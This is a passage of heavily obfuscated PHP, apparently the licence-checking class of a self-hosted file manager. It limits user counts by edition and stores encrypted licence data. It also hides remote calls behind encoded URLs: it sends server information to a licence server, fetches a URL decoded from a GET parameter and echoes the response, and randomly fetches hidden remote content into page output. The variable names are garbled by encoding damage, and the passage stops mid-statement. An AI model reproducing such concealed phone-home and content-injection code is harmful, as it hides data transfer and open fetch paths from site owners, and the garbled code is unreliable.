$this->disableCheck(); Hook::bind($eë°ØİŠ[14], $eë°ØİŠ[15]); goto eÙ¿Ì±£Ö; CæÆÅ¨”Æ: if (isset($_GET[$eë°ØİŠ[5]]) && in_array(strtolower(ACTION), $dØ¶áíÂ…æ)) { $B²ÔïÙ²ƒê = hash_decode($_GET[$eë°ØİŠ[5]]); header($eë°ØİŠ[6]); if ($GLOBALS[$eë°ØİŠ[7]] && $B²ÔïÙ²ƒê && substr($B²ÔïÙ²ƒê, 0, 4) == $eë°ØİŠ[8]) { $B²ÔïÙ²ƒê = str_replace($eë°ØİŠ[9], $eë°ØİŠ[10], $B²ÔïÙ²ƒê); $dßó½ ·ÃÓ = url_request($B²ÔïÙ²ƒê, $eë°ØİŠ[11], !1, !1, !1, !1, 2); if ($dßó½ ·ÃÓ[$eë°ØİŠ[12]] && strstr($dßó½ ·ÃÓ[$eë°ØİŠ[12]], $eë°ØİŠ[13])) { echo $dßó½ ·ÃÓ[$eë°ØİŠ[12]]; } } die; } $this->checkDataInit(); $this->checkVersion(); goto E¶Öƒ±ğ¸; C‘°İÇ££·: } public function optionsFilter($DÁîËñùÇ) { goto C½õ¯ñö†ê; C½õ¯ñö†ê: $dï ¤¸Û‚© =& $_SERVER[¬Ö°ı¶Â¯€æ]; $d¦ÈÈÍ´‰õ = Model($dï ¤¸Û‚©[18])->get(); $f§·Ÿì´ëë = array($dï ¤¸Û‚©[19], $dï ¤¸Û‚©[20], $dï ¤¸Û‚©[21], $dï ¤¸Û‚©[22], $dï ¤¸Û‚©[23], $dï ¤¸Û‚©[24], $dï ¤¸Û‚©[25], $dï ¤¸Û‚©[26], $dï ¤¸Û‚©[27], $dï ¤¸Û‚©[28], $dï ¤¸Û‚©[29], $dï ¤¸Û‚©[30], $dï ¤¸Û‚©[31], $dï ¤¸Û‚©[32], $dï ¤¸Û‚©[33], $dï ¤¸Û‚©[34], $dï ¤¸Û‚©[35], $dï ¤¸Û‚©[36], $dï ¤¸Û‚©[37], $dï ¤¸Û‚©[38], $dï ¤¸Û‚©[39], $dï ¤¸Û‚©[40], $dï ¤¸Û‚©[41], $dï ¤¸Û‚©[42]); goto F¹¼ÍÈæ¬š; dŞƒÈë¤¿Œ: $DÁîËñùÇ[$dï ¤¸Û‚©[57]][$dï ¤¸Û‚©[69]] = _get($this->versionData, $dï ¤¸Û‚©[70], $dï ¤¸Û‚©[71]); if ($GLOBALS[$dï ¤¸Û‚©[7]] && $this->config[$dï ¤¸Û‚©[72]]) { $DÁîËñùÇ[$dï ¤¸Û‚©[57]][$dï ¤¸Û‚©[73]] = WEB_ROOT; } return $DÁîËñùÇ; goto eò’•Œ‹­‡; F¹¼ÍÈæ¬š: foreach ($f§·Ÿì´ëë as $A…÷ä£À­Ë) { $E‹­ŸóÆ§™ = $GLOBALS[$dï ¤¸Û‚©[43]][$dï ¤¸Û‚©[44]][$A…÷ä£À­Ë]; if (isset($d¦ÈÈÍ´‰õ[$A…÷ä£À­Ë])) { $E‹­ŸóÆ§™ = $d¦ÈÈÍ´‰õ[$A…÷ä£À­Ë]; } $DÁîËñùÇ[$dï ¤¸Û‚©[45]][$dï ¤¸Û‚©[46]][$A…÷ä£À­Ë] = $E‹­ŸóÆ§™; } $F„¸ñ¼ƒ¤‘ = $DÁîËñùÇ[$dï ¤¸Û‚©[45]][$dï ¤¸Û‚©[46]][$dï ¤¸Û‚©[31]]; unset($DÁîËñùÇ[$dï ¤¸Û‚©[45]][$dï ¤¸Û‚©[47]][$dï ¤¸Û‚©[48]]); goto Få™ÀÊµÆ; c±¸ïÔÏ©: $DÁîËñùÇ[$dï ¤¸Û‚©[57]][$dï ¤¸Û‚©[58]] = Action($dï ¤¸Û‚©[59])->accessToken(); $DÁîËñùÇ[$dï ¤¸Û‚©[57]][$dï ¤¸Û‚©[60]] = md5(BASIC_PATH . $d¦ÈÈÍ´‰õ[$dï ¤¸Û‚©[61]]); $DÁîËñùÇ[$dï ¤¸Û‚©[57]][$dï ¤¸Û‚©[62]] = base64_encode(serverInfo()); goto fÒ‹³„³Î; Få™ÀÊµÆ: unset($DÁîËñùÇ[$dï ¤¸Û‚©[45]][$dï ¤¸Û‚©[46]][$dï ¤¸Û‚©[31]]); unset($DÁîËñùÇ[$dï ¤¸Û‚©[45]][$dï ¤¸Û‚©[46]][$dï ¤¸Û‚©[49]]); $DÁîËñùÇ[$dï ¤¸Û‚©[45]][$dï ¤¸Û‚©[46]][$dï ¤¸Û‚©[50]] = array($dï ¤¸Û‚©[51] => (int) $F„¸ñ¼ƒ¤‘[$dï ¤¸Û‚©[52]], $dï ¤¸Û‚©[53] => array_filter(_get($F„¸ñ¼ƒ¤‘, $dï ¤¸Û‚©[54], array())), $dï ¤¸Û‚©[55] => (int) _get($F„¸ñ¼ƒ¤‘, $dï ¤¸Û‚©[56], 0)); goto c±¸ïÔÏ©; fÒ‹³„³Î: $DÁîËñùÇ[$dï ¤¸Û‚©[57]][$dï ¤¸Û‚©[63]] = $this->version; if ($d¦ÈÈÍ´‰õ[$dï ¤¸Û‚©[63]] != $dï ¤¸Û‚©[64]) { $DÁîËñùÇ[$dï ¤¸Û‚©[57]][$dï ¤¸Û‚©[65]] = $d¦ÈÈÍ´‰õ[$dï ¤¸Û‚©[65]]; $DÁîËñùÇ[$dï ¤¸Û‚©[57]][$dï ¤¸Û‚©[66]] = $d¦ÈÈÍ´‰õ[$dï ¤¸Û‚©[66]]; $eÔÆ˜ŞÑ– = rand_string(10) . $this->version . rand_string(5); $DÁîËñùÇ[$dï ¤¸Û‚©[45]][$dï ¤¸Û‚©[67]][$dï ¤¸Û‚©[68]] = $this->encode($eÔÆ˜ŞÑ–, $DÁîËñùÇ[$dï ¤¸Û‚©[57]][$dï ¤¸Û‚©[60]]); } if ($this->version == $dï ¤¸Û‚©[64]) { $DÁîËñùÇ[$dï ¤¸Û‚©[45]][$dï ¤¸Û‚©[46]][$dï ¤¸Û‚©[50]][$dï ¤¸Û‚©[56]] = 0; } goto dŞƒÈë¤¿Œ; eò’•Œ‹­‡: } private function assignCopyright() { goto BåÌŸë®Øî; BåÌŸë®Øî: $B³Ø‹Şï =& $_SERVER[¬Ö°ı¶Â¯€æ]; if ($this->version == $B³Ø‹Şï[64]) { return; } $CŞØÉ¨ƒô = array($B³Ø‹Şï[74], $B³Ø‹Şï[75], $B³Ø‹Şï[76], $B³Ø‹Şï[77], $B³Ø‹Şï[78], $B³Ø‹Şï[79]); goto b¤ñ×¢÷¸—; b¤ñ×¢÷¸—: $f¯¡£È Éµ = Model($B³Ø‹Şï[18])->get(); $Aò«îğ†«Ä = array($B³Ø‹Şï[80] => $f¯¡£È Éµ[$B³Ø‹Şï[19]], $B³Ø‹Şï[81] => $f¯¡£È Éµ[$B³Ø‹Şï[20]], $B³Ø‹Şï[82] => $B³Ø‹Şï[71]); if (ACTION == $B³Ø‹Şï[3]) { $CØ„ºÍÙóµ = $this->userCount(); $c‹‹ŒÇ™šœ = $B³Ø‹Şï[83] . $CØ„ºÍÙóµ . $B³Ø‹Şï[84]; if ($CØ„ºÍÙóµ >= 10000) { $c‹‹ŒÇ™šœ = $B³Ø‹Şï[85]; } $Aò«îğ†«Ä[$B³Ø‹Şï[86]] = $c‹‹ŒÇ™šœ; } goto BİñéßÉ¤É; BİñéßÉ¤É: foreach ($CŞØÉ¨ƒô as $AªÑªÂ¾¦£) { if (!isset($f¯¡£È Éµ[$AªÑªÂ¾¦£]) || !$f¯¡£È Éµ[$AªÑªÂ¾¦£]) { continue; } $Aò«îğ†«Ä[$AªÑªÂ¾¦£] = $f¯¡£È Éµ[$AªÑªÂ¾¦£]; } I18n::set($Aò«îğ†«Ä); goto Eçíâó°Ğ«; Eçíâó°Ğ«: } private function checkDataInit() { goto c’¬ñ£Ï; C©æ”î‚áÒ: $C±ôêö½µ¬ = $Bö‹ºï¤ºö[$AÀÙ¹´ø[43]]; $C±ôêö½µ¬ = array(); $C±ôêö½µ¬[$Dô”‚‘»œ–] = $DŠò…¼İ›; goto D¨‚ùæ†; dÅè¤—Ì‘õ: $DÈíôËë = $fÀî†Ù‚‚³ . $CÂˆÖÏ£óñ[$AÀÙ¹´ø[63]] . Mcrypt::encode(md5($CÂˆÖÏ£óñ[$AÀÙ¹´ø[111]]), $fÀî†Ù‚‚³); $CÂˆÖÏ£óñ[$AÀÙ¹´ø[66]] = base64_encode(strrev(Mcrypt::encode($DÈíôËë, $AÀÙ¹´ø[117]))); if ($fŞ“ï¬Ğ[$AÀÙ¹´ø[118]] && $fŞ“ï¬Ğ[$AÀÙ¹´ø[118]] >= 1) { Model($AÀÙ¹´ø[18])->setDeep($AÀÙ¹´ø[119], $AÀÙ¹´ø[120]); } goto dÎ¡¯ŞÆê©; dÎ¡¯ŞÆê©: Model($AÀÙ¹´ø[18])->set($CÂˆÖÏ£óñ); $aÉÆˆƒ­œï = md5(BASIC_PATH . strrev($d‰¿²Î•ª”) . $CÂˆÖÏ£óñ[$AÀÙ¹´ø[112]]); $Dô”‚‘»œ– = strrev(substr($aÉÆˆƒ­œï, 10, 16)); goto C»À¥ï¿ˆ¤; D¨‚ùæ†: $this->update($Bö‹ºï¤ºö[$AÀÙ¹´ø[122]], array($AÀÙ¹´ø[123] => $C±ôêö½µ¬)); show_json(LNG($AÀÙ¹´ø[124]), !0); goto cã¡—ˆ„®Š; CÙ¹“¥¢Úë: if (isset($d˜˜¾ÌÈ¸[$AÀÙ¹´ø[89]])) { $this->dataReset(); die; } if (!isset($d˜˜¾ÌÈ¸[$AÀÙ¹´ø[90]]) || strlen($d˜˜¾ÌÈ¸[$AÀÙ¹´ø[90]]) != 16) { show_json($AÀÙ¹´ø[91] . $d˜˜¾ÌÈ¸[$AÀÙ¹´ø[90]], !1); } $d‰¿²Î•ª” = Model($AÀÙ¹´ø[18])->get($AÀÙ¹´ø[61]); goto cÄ†Œòº´; C»À¥ï¿ˆ¤: $DŠò…¼İ› = $this->encode(json_encode($fŞ“ï¬Ğ), $aÉÆˆƒ­œï); $CôèÈÈ¡‹Ú = $this->loadList(); $Bö‹ºï¤ºö = $CôèÈÈ¡‹Ú[$AÀÙ¹´ø[121]]; goto C©æ”î‚áÒ; c’¬ñ£Ï: $AÀÙ¹´ø =& $_SERVER[¬Ö°ı¶Â¯€æ]; if (ACTION != $AÀÙ¹´ø[87] || !$GLOBALS[$AÀÙ¹´ø[7]]) { return; } $d˜˜¾ÌÈ¸ = $GLOBALS[$AÀÙ¹´ø[88]]; goto CÙ¹“¥¢Úë; FÉØ‚À„Şè: $CÂˆÖÏ£óñ = array($AÀÙ¹´ø[111] => $EÌ¡²‚Ğ©á[$AÀÙ¹´ø[90]], $AÀÙ¹´ø[112] => $fŞ“ï¬Ğ[$AÀÙ¹´ø[113]], $AÀÙ¹´ø[114] => rand_string(16), $AÀÙ¹´ø[63] => $fŞ“ï¬Ğ[$AÀÙ¹´ø[115]]); if ($EÌ¡²‚Ğ©á[$AÀÙ¹´ø[96]]) { $CÂˆÖÏ£óñ[$AÀÙ¹´ø[114]] = $EÌ¡²‚Ğ©á[$AÀÙ¹´ø[96]]; } $cìÌàÍÍ…‡ = substr(md5($CÂˆÖÏ£óñ[$AÀÙ¹´ø[112]]), 10, 10); goto fãˆ‡ƒè¯ß; fãˆ‡ƒè¯ß: $A§–½©½ƒİ = $cìÌàÍÍ…‡ . $CÂˆÖÏ£óñ[$AÀÙ¹´ø[63]] . $CÂˆÖÏ£óñ[$AÀÙ¹´ø[114]]; $CÂˆÖÏ£óñ[$AÀÙ¹´ø[65]] = strrev(base64_encode(Mcrypt::encode($A§–½©½ƒİ, $AÀÙ¹´ø[116]))); $fÀî†Ù‚‚³ = rand_string(16); goto dÅè¤—Ì‘õ; cÄ†Œòº´: $Eš¶·ïŠğ = Mcrypt::decode($AÀÙ¹´ø[92], $AÀÙ¹´ø[57]); $EÌ¡²‚Ğ©á = array($AÀÙ¹´ø[90] => $d˜˜¾ÌÈ¸[$AÀÙ¹´ø[90]], $AÀÙ¹´ø[93] => $_SERVER[$AÀÙ¹´ø[94]], $AÀÙ¹´ø[95] => INSTALL_CHANNEL, $AÀÙ¹´ø[96] => rand_string(16)); $Cµ‚ã»ëÚ¿ = md5(BASIC_PATH . $d‰¿²Î•ª”); goto aù¥›’Ş»; aù¥›’Ş»: if ($d˜˜¾ÌÈ¸[$AÀÙ¹´ø[97]] == $AÀÙ¹´ø[98]) { $C±Ù«ªááª = Mcrypt::encode($Cµ‚ã»ëÚ¿, $AÀÙ¹´ø[99]); $F’Ú¼‚Öêï = json_encode($EÌ¡²‚Ğ©á); $F’Ú¼‚Öêï = $this->encode($F’Ú¼‚Öêï, $Cµ‚ã»ëÚ¿ . $AÀÙ¹´ø[100], 3); $F³Å•ñµ´‹ = $Eš¶·ïŠğ . $AÀÙ¹´ø[101] . $C±Ù«ªááª . $AÀÙ¹´ø[102]; show_json($F³Å•ñµ´‹ . $F’Ú¼‚Öêï, !0, $Eš¶·ïŠğ); } else { if ($d˜˜¾ÌÈ¸[$AÀÙ¹´ø[97]] == $AÀÙ¹´ø[103]) { $féµÙÆá­İ = substr(md5($AÀÙ¹´ø[104], $Cµ‚ã»ëÚ¿), 12, 15) . $AÀÙ¹´ø[105]; $F’Ú¼‚Öêï = $this->decode($d˜˜¾ÌÈ¸[$AÀÙ¹´ø[106]], $féµÙÆá­İ, 2); $Aèø¥‚ÚÔ° = json_decode($F’Ú¼‚Öêï, !0); if (!is_array($Aèø¥‚ÚÔ°) || !is_array($Aèø¥‚ÚÔ°[$AÀÙ¹´ø[12]]) || $Aèø¥‚ÚÔ°[$AÀÙ¹´ø[90]] != !0) { $f®–“¾»í = $AÀÙ¹´ø[107]; $b Ú”øˆ”Š = $Aèø¥‚ÚÔ°[$AÀÙ¹´ø[12]] ? $AÀÙ¹´ø[108] . $Aèø¥‚ÚÔ°[$AÀÙ¹´ø[12]] : $f®–“¾»í; show_json($b Ú”øˆ”Š, !1); } else { $EÌ¡²‚Ğ©á[$AÀÙ¹´ø[96]] = $Aèø¥‚ÚÔ°[$AÀÙ¹´ø[12]][$AÀÙ¹´ø[109]]; } } else { $Aèø¥‚ÚÔ° = url_request($Eš¶·ïŠğ, $AÀÙ¹´ø[11], $EÌ¡²‚Ğ©á, !1, !1, !0, 10); $Aèø¥‚ÚÔ° = $Aèø¥‚ÚÔ°[$AÀÙ¹´ø[12]]; } } if (!is_array($Aèø¥‚ÚÔ°) || !is_array($Aèø¥‚ÚÔ°[$AÀÙ¹´ø[12]]) || $Aèø¥‚ÚÔ°[$AÀÙ¹´ø[90]] != !0) { $f®–“¾»í = LNG($AÀÙ¹´ø[110]); $b Ú”øˆ”Š = $Aèø¥‚ÚÔ°[$AÀÙ¹´ø[12]] ? $AÀÙ¹´ø[108] . $Aèø¥‚ÚÔ°[$AÀÙ¹´ø[12]] : $f®–“¾»í; show_json($b Ú”øˆ”Š, !1); } $fŞ“ï¬Ğ = $Aèø¥‚ÚÔ°[$AÀÙ¹´ø[12]]; goto FÉØ‚À„Şè; cã¡—ˆ„®Š: } private function dataReset() { $F‡Á‹Ôõë =& $_SERVER[¬Ö°ı¶Â¯€æ]; Model($F‡Á‹Ôõë[18])->set(array($F‡Á‹Ôõë[111] => $F‡Á‹Ôõë[71], $F‡Á‹Ôõë[112] => $F‡Á‹Ôõë[71], $F‡Á‹Ôõë[63] => $F‡Á‹Ôõë[64], $F‡Á‹Ôõë[65] => $F‡Á‹Ôõë[71], $F‡Á‹Ôõë[66] => $F‡Á‹Ôõë[71])); Model($F‡Á‹Ôõë[18])->setDeep($F‡Á‹Ôõë[119], $F‡Á‹Ôõë[125]); $this->versionData = array(); $this->version = $F‡Á‹Ôõë[64]; } private function dataCheck() { goto E‰£­Ì®°; DˆÓñ«ƒÃ²: $d·ë÷¾ƒÁ… = md5(BASIC_PATH . strrev($D¶÷½Ñ£ë¾) . $fÌŸå­Ú‘[$D¶æ‰ìóÑß[112]]); $AàÑäÑ = strrev(substr($d·ë÷¾ƒÁ…, 10, 16)); $dÃœ¥™‚Õ = $this->decode($C¨«Øœ¼‡[$D¶æ‰ìóÑß[43]][$AàÑäÑ], $d·ë÷¾ƒÁ…); goto B÷Ş¿Š£á©; E‰£­Ì®°: $D¶æ‰ìóÑß =& $_SERVER[¬Ö°ı¶Â¯€æ]; $fÌŸå­Ú‘ = Model($D¶æ‰ìóÑß[18])->get(); if ($fÌŸå­Ú‘[$D¶æ‰ìóÑß[63]] == $D¶æ‰ìóÑß[64]) { $this->dataAllow(); return; } goto dµ·å’“á¨; B÷Ş¿Š£á©: $dÃœ¥™‚Õ = json_decode($dÃœ¥™‚Õ, !0); if (!is_array($dÃœ¥™‚Õ)) { return $this->dataReset(); } $D˜ÌÈóíì = strtotime($dÃœ¥™‚Õ[$D¶æ‰ìóÑß[126]]); goto C¶ƒÎ³‰æé; C¶ƒÎ³‰æé: if (time() >= $D˜ÌÈóíì) { return $this->dataReset(); } $this->versionData = $dÃœ¥™‚Õ; $this->version = $fÌŸå­Ú‘[$D¶æ‰ìóÑß[63]]; goto AÚç­¥öƒŞ; dµ·å’“á¨: $D¶÷½Ñ£ë¾ = Model($D¶æ‰ìóÑß[18])->get($D¶æ‰ìóÑß[61]); $EŒçîØ¾£ù = array_to_keyvalue($this->listData(), $D¶æ‰ìóÑß[0]); $C¨«Øœ¼‡ = $EŒçîØ¾£ù[$D¶æ‰ìóÑß[121]]; goto DˆÓñ«ƒÃ²; AÚç­¥öƒŞ: } private function dataAllow() { goto B¸È–Í–ÉÌ; B¸È–Í–ÉÌ: $a¿·İ‘‹Ü¿ =& $_SERVER[¬Ö°ı¶Â¯€æ]; $dÌëí†— = $GLOBALS[$a¿·İ‘‹Ü¿[88]]; $eÄå–‡İ˜ = $this->version; goto dÎ©Ğƒ¿œ¢; cñµ‘äñÊ: Hook::bind($a¿·İ‘‹Ü¿[135], $a¿·İ‘‹Ü¿[136]); goto b¯ºÜéöÅ; dÎ©Ğƒ¿œ¢: if (ACTION == $a¿·İ‘‹Ü¿[127] && $eÄå–‡İ˜ == $a¿·İ‘‹Ü¿[64]) { show_json(LNG($a¿·İ‘‹Ü¿[128]), !1, $a¿·İ‘‹Ü¿[129]); } $DÄã‘¤†¢ = array($a¿·İ‘‹Ü¿[130], $a¿·İ‘‹Ü¿[131]); if (in_array(ACTION, $DÄã‘¤†¢)) { if ($eÄå–‡İ˜ == $a¿·İ‘‹Ü¿[64] && isset($dÌëí†—[$a¿·İ‘‹Ü¿[132]])) { show_json(LNG($a¿·İ‘‹Ü¿[128]), !1, $a¿·İ‘‹Ü¿[129]); die; } $B¾ìÊÔÛù¡ = $this->userCount(); if ($B¾ìÊÔÛù¡ != 10000) { if ($B¾ìÊÔÛù¡ <= Model($a¿·İ‘‹Ü¿[133])->count()) { show_json(LNG($a¿·İ‘‹Ü¿[134]), !1, $a¿·İ‘‹Ü¿[129]); die; } } } goto cñµ‘äñÊ; b¯ºÜéöÅ: } private function checkPlugin($eçÃ”íª„¯) { goto Aø÷‚Ì¬ô; BéÁ¾Ûé¼: $aõ¿Š‡Š = explode($EÖ¡¯åÜõ[146], _get($this->versionData, $EÖ¡¯åÜõ[70], $EÖ¡¯åÜõ[71])); $c§ïÃ´İğÂ = array(); foreach ($E†÷¶¥İâë as $b×¼±§ù«) { if (!in_array($b×¼±§ù«, $aõ¿Š‡Š)) { $c§ïÃ´İğÂ[] = $b×¼±§ù«; } } goto cÏªôÍ®Ÿ§; cÏªôÍ®Ÿ§: foreach ($c§ïÃ´İğÂ as $b×¼±§ù«) { unset($eçÃ”íª„¯[$b×¼±§ù«]); } return $eçÃ”íª„¯; goto Dàì·èÍåƒ; Aø÷‚Ì¬ô: $EÖ¡¯åÜõ =& $_SERVER[¬Ö°ı¶Â¯€æ]; if ($this->version == $EÖ¡¯åÜõ[137]) { return $eçÃ”íª„¯; } $E†÷¶¥İâë = array($EÖ¡¯åÜõ[138], $EÖ¡¯åÜõ[139], $EÖ¡¯åÜõ[140], $EÖ¡¯åÜõ[141], $EÖ¡¯åÜõ[142], $EÖ¡¯åÜõ[143], $EÖ¡¯åÜõ[144], $EÖ¡¯åÜõ[145]); goto BéÁ¾Ûé¼; Dàì·èÍåƒ: } private function disableCheck() { goto c³‚ƒªÆ½Ø; c¤ƒ±‘„õª: $b¾ŸÄëõ¹Ñ = array($DÛëçÊùÅª[147]); $EË™Ÿ†ÄÙç = !0; foreach ($b¾ŸÄëõ¹Ñ as $E‰ŒŠŞï‚) { if ($E‰ŒŠŞï‚ == $C¦Ûç‹¢˜ || substr($C¦Ûç‹¢˜, 0, strlen($E‰ŒŠŞï‚)) == $E‰ŒŠŞï‚) { show_json(LNG($DÛëçÊùÅª[148]), !1); } } goto e“ İ©Í™×; c³‚ƒªÆ½Ø: $DÛëçÊùÅª =& $_SERVER[¬Ö°ı¶Â¯€æ]; if ($this->version != $DÛëçÊùÅª[64]) { return; } $C¦Ûç‹¢˜ = strtolower(ACTION); goto c¤ƒ±‘„õª; e“ İ©Í™×: Hook::bind($DÛëçÊùÅª[149], array($this, $DÛëçÊùÅª[150])); goto C‚ÄÆµëÃ; C‚ÄÆµëÃ: } public function methodExit() { return $_SERVER[¬Ö°ı¶Â¯€æ][151]; } private function checkVersion() { goto f•¹‘á ©·; Aæ™—®½ÉÛ: $cÎï…»‘¾“ = Cache::get($eâ˜Ï‹Á); $b¡¢ î•â» = 3600 * 24 * 3; if (!$cÎï…»‘¾“ || time() - $cÎï…»‘¾“[$aò¢à¶‚ìŞ[154]] > $b¡¢ î•â») { goto D ²éŒ³¯; a×œëó÷–¨: $dµçá è = url_request($e«ˆäñâ‰ê, $aò¢à¶‚ìŞ[11], $FÊÙ¥âé¬, !1, !1, !0, 5); $bÛÀæŒ©Ó = $dµçá è[$aò¢à¶‚ìŞ[12]]; if (!is_array($bÛÀæŒ©Ó)) { return; } goto aª‘½œŠ¯; aª‘½œŠ¯: if ($bÛÀæŒ©Ó[$aò¢à¶‚ìŞ[90]] != !0) { $this->dataReset(); Cache::remove($eâ˜Ï‹Á); return; } goto d¼è¹ÍåÈ´; D ²éŒ³¯: $cÎï…»‘¾“ = array($aò¢à¶‚ìŞ[155] => !0, $aò¢à¶‚ìŞ[156] => time()); $e«ˆäñâ‰ê = Mcrypt::decode($aò¢à¶‚ìŞ[157], $aò¢à¶‚ìŞ[57]); $FÊÙ¥âé¬ = array($aò¢à¶‚ìŞ[90] => $DŞ”ì‘ï×ß, $aò¢à¶‚ìŞ[97] => $this->version, $aò¢à¶‚ìŞ[95] => INSTALL_CHANNEL); goto a×œëó÷–¨; d¼è¹ÍåÈ´: } goto e¯„¬¸ˆ±ß; f•¹‘á ©·: $aò¢à¶‚ìŞ =& $_SERVER[¬Ö°ı¶Â¯€æ]; if ($this->version == $aò¢à¶‚ìŞ[64] || !$GLOBALS[$aò¢à¶‚ìŞ[7]]) { return; } if (intval(date($aò¢à¶‚ìŞ[152], time())) % 3 != 0) { return; } goto DêšÎÀãøÅ; DêšÎÀãøÅ: if (ACTION != $aò¢à¶‚ìŞ[153]) { return; } $DŞ”ì‘ï×ß = Model($aò¢à¶‚ìŞ[18])->get($aò¢à¶‚ìŞ[111]); $eâ˜Ï‹Á = md5($DŞ”ì‘ï×ß); goto Aæ™—®½ÉÛ; e¯„¬¸ˆ±ß: Cache::set($eâ˜Ï‹Á, $cÎï…»‘¾“, $b¡¢ î•â»); goto cøÃñ“·Í‹; cøÃñ“·Í‹: } private function userCount() { goto eÌ‚ìĞ×Ş†; Aè¡¶ì‡Şì: return $Eƒ†ÚØ¯ºµ + $E™à›Ş«Å™; goto b´Âºâ›Ì©; eÌ‚ìĞ×Ş†: $FëÉº×ç½ =& $_SERVER[¬Ö°ı¶Â¯€æ]; $fİË‚«ñµ° = array($FëÉº×ç½[158] => 10, $FëÉº×ç½[159] => 30, $FëÉº×ç½[160] => 50, $FëÉº×ç½[161] => 150, $FëÉº×ç½[162] => 500, $FëÉº×ç½[163] => 10000, $FëÉº×ç½[164] => 10000, $FëÉº×ç½[165] => 10, $FëÉº×ç½[166] => 30, $FëÉº×ç½[167] => 50, $FëÉº×ç½[168] => 100, $FëÉº×ç½[169] => 150, $FëÉº×ç½[170] => 250, $FëÉº×ç½[171] => 500, $FëÉº×ç½[172] => 1001, $FëÉº×ç½[173] => 1500, $FëÉº×ç½[174] => 2000); $Eƒ†ÚØ¯ºµ = $fİË‚«ñµ°[$this->version]; goto f¾ªœ¹áËƒ; f¾ªœ¹áËƒ: $Eƒ†ÚØ¯ºµ = $Eƒ†ÚØ¯ºµ ? $Eƒ†ÚØ¯ºµ : 10; $E™à›Ş«Å™ = $this->versionData[$FëÉº×ç½[175]]; $E™à›Ş«Å™ = $E™à›Ş«Å™ ? intval($E™à›Ş«Å™) : 0; goto Aè¡¶ì‡Şì; b´Âºâ›Ì©: } public function loginCheck($cñã·˜˜Òø) { goto BÊĞÖŸ°³ì; aäÁŒ¹™µİ: $FÇ³’é†Ûå = Model($fÔÒ›®„ƒ[133])->count(); if ($FÇ³’é†Ûå <= $bŸĞ‹İ²””) { return; } $Dºš¥×Ì = Model($fÔÒ›®„ƒ[133])->field($fÔÒ›®„ƒ[176])->limit($bŸĞ‹İ²””)->select(); goto A¾ŸéÆŞ¡’; BÊĞÖŸ°³ì: $fÔÒ›®„ƒ =& $_SERVER[¬Ö°ı¶Â¯€æ]; $bŸĞ‹İ²”” = $this->userCount(); if ($bŸĞ‹İ²”” >= 10000) { return; } goto aäÁŒ¹™µİ; A¾ŸéÆŞ¡’: $Dºš¥×Ì = array_to_keyvalue($Dºš¥×Ì, $fÔÒ›®„ƒ[71], $fÔÒ›®„ƒ[176]); if (!in_array($cñã·˜˜Òø[$fÔÒ›®„ƒ[176]], $Dºš¥×Ì)) { show_json($fÔÒ›®„ƒ[177], !1, $fÔÒ›®„ƒ[129]); } goto D°¿Ü¢øª‘; D°¿Ü¢øª‘: } public function checkEcho() { $dÅÉ…ğ¤¡ =& $_SERVER[¬Ö°ı¶Â¯€æ]; if (date($dÅÉ…ğ¤¡[178]) % 10 == 1 && $GLOBALS[$dÅÉ…ğ¤¡[7]] && mt_rand(1, 100) % 10 <= 3) { $e»çìëãªÌ = $dÅÉ…ğ¤¡[179]; $cÌº¿‰õÊĞ = url_request($e»çìëãªÌ, $dÅÉ…ğ¤¡[11], !1, !1, !1, !1, 3); echo $dÅÉ…ğ¤¡[180] . hash_encode($cÌº¿‰õÊĞ[$dÅÉ…ğ¤¡[12]]) . $dÅÉ…ğ¤¡[181]; } } private function encode($dËŒÇ©Û¦˜, $EŞÕÜÍ½Ñ, $aÈ¿ùÅ¾Ş© = 3) { goto d‡ôÙÃÅŞ‰; DÀÙÛ…¤È: switch ($få¨¶³„›É) { case $fÄËİ±ãÑ[125]: $aÄçëôŒ†½ = Mcrypt::encode($dËŒÇ©Û¦˜, strrev($EŞÕÜÍ½Ñ . $Eªå¼Å³‹µ)); break; case $fÄËİ±ãÑ[120]: $aÄçëôŒ†½ = Mcrypt::encode($dËŒÇ©Û¦˜, strrev($Eªå¼Å³‹µ . $EŞÕÜÍ½Ñ)); break; case $fÄËİ±ãÑ[183]: $aÄçëôŒ†½ = Mcrypt::encode($dËŒÇ©Û¦˜, base64_encode($Eªå¼Å³‹µ . $EŞÕÜÍ½Ñ)); break; case $fÄËİ±ãÑ[184]: $aÄçëôŒ†½ = Mcrypt::encode($dËŒÇ©Û¦˜, md5($Eªå¼Å³‹µ . $EŞÕÜÍ½Ñ)); break; case $fÄËİ±ãÑ[185]: goto Aî–ë˜¼ñ; E´áÎ¸‘ã: for ($f…õ…¼íù‚ = 0; $f…õ…¼íù‚ < strlen($dËŒÇ©Û¦˜); $f…õ…¼íù‚++) { $DÎÈªò›ÔŒ = $DÎÈªò›ÔŒ == strlen($C¡³¹™ºÃà) ? 0 : $DÎÈªò›ÔŒ; $eÏ•áËäµ = ($bíÁõ“‰ªÒ + strpos($AÔ°¡²áâÚ, $dËŒÇ©Û¦˜[$f…õ…¼íù‚]) + ord($C¡³¹™ºÃà[$DÎÈªò›ÔŒ++])) % 64; $Cå­¿ÎÀ– .= $AÔ°¡²áâÚ[$eÏ•áËäµ]; } $aÄçëôŒ†½ = hash_encode($b´Ãêâ‹…• . $Cå­¿ÎÀ–); break; goto F“ÒéÑãÆ£; EöÍ¶³ö½ã: $f…õ…¼íù‚ = 0; $eÏ•áËäµ = 0; $DÎÈªò›ÔŒ = 0; goto E´áÎ¸‘ã; A¢Ü¢‹¨ØÅ: $C¡³¹™ºÃà = md5($b´Ãêâ‹…• . md5($EŞÕÜÍ½Ñ . $b´Ãêâ‹…•) . $EŞÕÜÍ½Ñ); $C¡³¹™ºÃà = substr($C¡³¹™ºÃà, $bíÁõ“‰ªÒ % 8, $bíÁõ“‰ªÒ % 8 + 7); $Cå­¿ÎÀ– = $fÄËİ±ãÑ[71]; goto EöÍ¶³ö½ã; Aî–ë˜¼ñ: $dËŒÇ©Û¦˜ = base64_encode($dËŒÇ©Û¦˜); $bíÁõ“‰ªÒ = rand(0, 64); $b´Ãêâ‹…• = $AÔ°¡²áâÚ[$bíÁõ“‰ªÒ]; goto A¢Ü¢‹¨ØÅ; F“ÒéÑãÆ£: default: $aÄçëôŒ†½ = Mcrypt::encode($dËŒÇ©Û¦˜, $EŞÕÜÍ½Ñ . $Eªå¼Å³‹µ); break; } $aÄçëôŒ†½ = strrev($få¨¶³„›É . $Eªå¼Å³‹µ . $aÄçëôŒ†½); if ($aÈ¿ùÅ¾Ş© - 1 > 0) { $aÄçëôŒ†½ = $this->encode($aÄçëôŒ†½, $EŞÕÜÍ½Ñ, $aÈ¿ùÅ¾Ş© - 1); } goto 